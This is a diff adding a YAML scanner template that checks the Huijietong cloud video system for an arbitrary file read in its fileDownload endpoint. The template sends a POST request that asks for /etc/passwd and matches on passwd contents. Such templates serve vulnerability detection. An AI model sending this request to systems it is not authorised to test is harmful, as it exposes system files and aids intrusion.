@@ -1,0 +1,17 @@
+id: poc-yaml-huijietong-cloud-video-arbitrary-file-read
+info:
+  name: 会捷通云视讯 fileDownload任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: jQuery
+requests:
+- method: POST
+  path: /fileDownload?action=downloadBackupFile
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: fullPath=%2Fetc%2Fpasswd
+  expression: status_code == 200 && contains(body,"/bin/bash") && contains(body,"/sbin/nologin")&&
+    content_type == "multipart/form-data"
+variables: {}
+transport: http
